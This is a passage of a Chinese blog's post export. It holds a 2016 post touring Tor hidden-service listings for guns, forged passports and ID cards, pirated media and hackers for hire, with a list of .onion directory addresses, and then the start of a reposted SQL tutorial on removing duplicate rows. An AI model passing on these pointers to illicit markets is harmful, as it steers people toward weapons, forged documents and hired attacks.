导航站\n\nhttp://dirnxxdraygbifgc.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\nhttp://32rfckwuorlf4dlv.onion/\n\nhttp://torwikignoueupfm.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\n## 搜索引擎\n\nhttp://xmh57jrzrnw6insl.onion/\n\n","source":"_posts/TOR暗网的秘密.md","raw":"---\ntitle: TOR暗网的秘密\ndate: 2016-11-26 01:00:34\ntags: Hack\ncategories: Hack\n---\n\nTOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。\n\n以下内容纯属虚构。\n\n<!--more -->\n\n# 另一个互联网世界\n\nTor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。\n\nTor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。\n\n下面 我们来逛一逛都有什么 奇葩的 py交易。\n### 虚拟主机交易\n\n![](/content/images/torworld/1.png)\n\n### 免费盗版市场\n\n盗版书\n\n![](/content/images/torworld/2.png)\n\n\n盗版音乐\n\n![](/content/images/torworld/13.png)\n\n\n### 英国枪支弹药交易\n\n![](/content/images/torworld/3.png)\n\n比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。\n\n（英国持枪是合法的，但是我不感兴趣）\n\n### 暗网iPhone交易\n\n不知道iPhone的货源，很便宜。\n\n![](/content/images/torworld/4.png)\n\n### 办证类\n\n美国护照\n\n![](/content/images/torworld/5.png)\n\n美国假身份证\n\n![](/content/images/torworld/7.png)\n\n英国护照\n\n![](/content/images/torworld/6.png)\n\n\n我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。\n\n### 博客\n\n![](/content/images/torworld/8.png)\n\n此外还有很多，没什么意思\n\n### 电子邮箱\n\n![](/content/images/torworld/9.png)\n\n几乎是全匿名的电子邮箱，用比特message登录的\n\n### 政治\n\n各种资本主义反动派论坛\n\n![](/content/images/torworld/10.png)\n\n![](/content/images/torworld/11.png)\n\n\n### 雇佣黑阔\n\n![](/content/images/torworld/12.png)\n\n日一个网站500欧元，还是挺赚的。\n\n### 其他的\n\n当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。\n\n\n## 导航站\n\nhttp://dirnxxdraygbifgc.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\nhttp://32rfckwuorlf4dlv.onion/\n\nhttp://torwikignoueupfm.onion/\n\nhttp://torlinkbgs6aabns.onion/\n\n## 搜索引擎\n\nhttp://xmh57jrzrnw6insl.onion/\n\n","slug":"TOR暗网的秘密","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xof001e5es5o72ramqp","content":"<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>\n<p>以下内容纯属虚构。</p>\n<a id=\"more\"></a>\n<h1 id=\"另一个互联网世界\"><a href=\"#另一个互联网世界\" class=\"headerlink\" title=\"另一个互联网世界\"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>\n<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>\n<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>\n<h3 id=\"虚拟主机交易\"><a href=\"#虚拟主机交易\" class=\"headerlink\" title=\"虚拟主机交易\"></a>虚拟主机交易</h3><p><img src=\"/content/images/torworld/1.png\" alt=\"\"></p>\n<h3 id=\"免费盗版市场\"><a href=\"#免费盗版市场\" class=\"headerlink\" title=\"免费盗版市场\"></a>免费盗版市场</h3><p>盗版书</p>\n<p><img src=\"/content/images/torworld/2.png\" alt=\"\"></p>\n<p>盗版音乐</p>\n<p><img src=\"/content/images/torworld/13.png\" alt=\"\"></p>\n<h3 id=\"英国枪支弹药交易\"><a href=\"#英国枪支弹药交易\" class=\"headerlink\" title=\"英国枪支弹药交易\"></a>英国枪支弹药交易</h3><p><img src=\"/content/images/torworld/3.png\" alt=\"\"></p>\n<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>\n<p>（英国持枪是合法的，但是我不感兴趣）</p>\n<h3 id=\"暗网iPhone交易\"><a href=\"#暗网iPhone交易\" class=\"headerlink\" title=\"暗网iPhone交易\"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>\n<p><img src=\"/content/images/torworld/4.png\" alt=\"\"></p>\n<h3 id=\"办证类\"><a href=\"#办证类\" class=\"headerlink\" title=\"办证类\"></a>办证类</h3><p>美国护照</p>\n<p><img src=\"/content/images/torworld/5.png\" alt=\"\"></p>\n<p>美国假身份证</p>\n<p><img src=\"/content/images/torworld/7.png\" alt=\"\"></p>\n<p>英国护照</p>\n<p><img src=\"/content/images/torworld/6.png\" alt=\"\"></p>\n<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>\n<h3 id=\"博客\"><a href=\"#博客\" class=\"headerlink\" title=\"博客\"></a>博客</h3><p><img src=\"/content/images/torworld/8.png\" alt=\"\"></p>\n<p>此外还有很多，没什么意思</p>\n<h3 id=\"电子邮箱\"><a href=\"#电子邮箱\" class=\"headerlink\" title=\"电子邮箱\"></a>电子邮箱</h3><p><img src=\"/content/images/torworld/9.png\" alt=\"\"></p>\n<p>几乎是全匿名的电子邮箱，用比特message登录的</p>\n<h3 id=\"政治\"><a href=\"#政治\" class=\"headerlink\" title=\"政治\"></a>政治</h3><p>各种资本主义反动派论坛</p>\n<p><img src=\"/content/images/torworld/10.png\" alt=\"\"></p>\n<p><img src=\"/content/images/torworld/11.png\" alt=\"\"></p>\n<h3 id=\"雇佣黑阔\"><a href=\"#雇佣黑阔\" class=\"headerlink\" title=\"雇佣黑阔\"></a>雇佣黑阔</h3><p><img src=\"/content/images/torworld/12.png\" alt=\"\"></p>\n<p>日一个网站500欧元，还是挺赚的。</p>\n<h3 id=\"其他的\"><a href=\"#其他的\" class=\"headerlink\" title=\"其他的\"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>\n<h2 id=\"导航站\"><a href=\"#导航站\" class=\"headerlink\" title=\"导航站\"></a>导航站</h2><p><a href=\"http://dirnxxdraygbifgc.onion/\" target=\"_blank\" rel=\"external\">http://dirnxxdraygbifgc.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\" target=\"_blank\" rel=\"external\">http://torlinkbgs6aabns.onion/</a></p>\n<p><a href=\"http://32rfckwuorlf4dlv.onion/\" target=\"_blank\" rel=\"external\">http://32rfckwuorlf4dlv.onion/</a></p>\n<p><a href=\"http://torwikignoueupfm.onion/\" target=\"_blank\" rel=\"external\">http://torwikignoueupfm.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\" target=\"_blank\" rel=\"external\">http://torlinkbgs6aabns.onion/</a></p>\n<h2 id=\"搜索引擎\"><a href=\"#搜索引擎\" class=\"headerlink\" title=\"搜索引擎\"></a>搜索引擎</h2><p><a href=\"http://xmh57jrzrnw6insl.onion/\" target=\"_blank\" rel=\"external\">http://xmh57jrzrnw6insl.onion/</a></p>\n","excerpt":"<p>TOR 是一个不可以吃的洋葱，众所周知洋葱新闻美国一个非常严谨的讽刺新闻公司，所以这个文章跟洋葱新闻没什么关系。</p>\n<p>以下内容纯属虚构。</p>","more":"<h1 id=\"另一个互联网世界\"><a href=\"#另一个互联网世界\" class=\"headerlink\" title=\"另一个互联网世界\"></a>另一个互联网世界</h1><p>Tor 内网是另一个世界，另一个世界规则。在Tor 内网，有各种违禁交易，交易一般都是使用比特币的，保证了绝对的匿名性。</p>\n<p>Tor 内网很有趣，几乎什么都有，甚至连搜索引擎，VPS服务，云服务都有。</p>\n<p>下面 我们来逛一逛都有什么 奇葩的 py交易。</p>\n<h3 id=\"虚拟主机交易\"><a href=\"#虚拟主机交易\" class=\"headerlink\" title=\"虚拟主机交易\"></a>虚拟主机交易</h3><p><img src=\"/content/images/torworld/1.png\" alt=\"\"></p>\n<h3 id=\"免费盗版市场\"><a href=\"#免费盗版市场\" class=\"headerlink\" title=\"免费盗版市场\"></a>免费盗版市场</h3><p>盗版书</p>\n<p><img src=\"/content/images/torworld/2.png\" alt=\"\"></p>\n<p>盗版音乐</p>\n<p><img src=\"/content/images/torworld/13.png\" alt=\"\"></p>\n<h3 id=\"英国枪支弹药交易\"><a href=\"#英国枪支弹药交易\" class=\"headerlink\" title=\"英国枪支弹药交易\"></a>英国枪支弹药交易</h3><p><img src=\"/content/images/torworld/3.png\" alt=\"\"></p>\n<p>比特币交易，一个Glock 19 - 9mm枪 500磅，比特币交易，当前交易金额相当于1.028比特币。</p>\n<p>（英国持枪是合法的，但是我不感兴趣）</p>\n<h3 id=\"暗网iPhone交易\"><a href=\"#暗网iPhone交易\" class=\"headerlink\" title=\"暗网iPhone交易\"></a>暗网iPhone交易</h3><p>不知道iPhone的货源，很便宜。</p>\n<p><img src=\"/content/images/torworld/4.png\" alt=\"\"></p>\n<h3 id=\"办证类\"><a href=\"#办证类\" class=\"headerlink\" title=\"办证类\"></a>办证类</h3><p>美国护照</p>\n<p><img src=\"/content/images/torworld/5.png\" alt=\"\"></p>\n<p>美国假身份证</p>\n<p><img src=\"/content/images/torworld/7.png\" alt=\"\"></p>\n<p>英国护照</p>\n<p><img src=\"/content/images/torworld/6.png\" alt=\"\"></p>\n<p>我只能感叹一句，这要是在我大中国，这价格绝对倒闭。太贵了。</p>\n<h3 id=\"博客\"><a href=\"#博客\" class=\"headerlink\" title=\"博客\"></a>博客</h3><p><img src=\"/content/images/torworld/8.png\" alt=\"\"></p>\n<p>此外还有很多，没什么意思</p>\n<h3 id=\"电子邮箱\"><a href=\"#电子邮箱\" class=\"headerlink\" title=\"电子邮箱\"></a>电子邮箱</h3><p><img src=\"/content/images/torworld/9.png\" alt=\"\"></p>\n<p>几乎是全匿名的电子邮箱，用比特message登录的</p>\n<h3 id=\"政治\"><a href=\"#政治\" class=\"headerlink\" title=\"政治\"></a>政治</h3><p>各种资本主义反动派论坛</p>\n<p><img src=\"/content/images/torworld/10.png\" alt=\"\"></p>\n<p><img src=\"/content/images/torworld/11.png\" alt=\"\"></p>\n<h3 id=\"雇佣黑阔\"><a href=\"#雇佣黑阔\" class=\"headerlink\" title=\"雇佣黑阔\"></a>雇佣黑阔</h3><p><img src=\"/content/images/torworld/12.png\" alt=\"\"></p>\n<p>日一个网站500欧元，还是挺赚的。</p>\n<h3 id=\"其他的\"><a href=\"#其他的\" class=\"headerlink\" title=\"其他的\"></a>其他的</h3><p>当然还有社工 库，😍情，各种其他的东西，这个不能写在这里，嘿嘿嘿。</p>\n<h2 id=\"导航站\"><a href=\"#导航站\" class=\"headerlink\" title=\"导航站\"></a>导航站</h2><p><a href=\"http://dirnxxdraygbifgc.onion/\">http://dirnxxdraygbifgc.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\">http://torlinkbgs6aabns.onion/</a></p>\n<p><a href=\"http://32rfckwuorlf4dlv.onion/\">http://32rfckwuorlf4dlv.onion/</a></p>\n<p><a href=\"http://torwikignoueupfm.onion/\">http://torwikignoueupfm.onion/</a></p>\n<p><a href=\"http://torlinkbgs6aabns.onion/\">http://torlinkbgs6aabns.onion/</a></p>\n<h2 id=\"搜索引擎\"><a href=\"#搜索引擎\" class=\"headerlink\" title=\"搜索引擎\"></a>搜索引擎</h2><p><a href=\"http://xmh57jrzrnw6insl.onion/\">http://xmh57jrzrnw6insl.onion/</a></p>"},{"title":"SQL重复记录查询（转载）","date":"2016-10-05T18:34:04.000Z","_content":"<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;例二：</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;select</font> * <font color=\"#0000ff\">from</font> testtable</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><font color=\"#0000ff\">&nbsp;where</font> numeber in (<font color=\"#0000ff\">select</font> number <font color=\"#0000ff\">from</font> people <font color=\"#0000ff\">group by</font> number <font color=\"#0000ff\">having count</font>(number) &gt; 1 )</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;可以查出testtable表中number相同的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;&nbsp;people&nbsp;&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(peopleId&nbsp;)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">3</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段）&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">4</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、删除表中多余的重复记录（多个字段），只留有rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">5</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录（多个字段），不包含rowid最小的记录<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;vitae&nbsp;a<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;(a.peopleId,a.seq)&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: 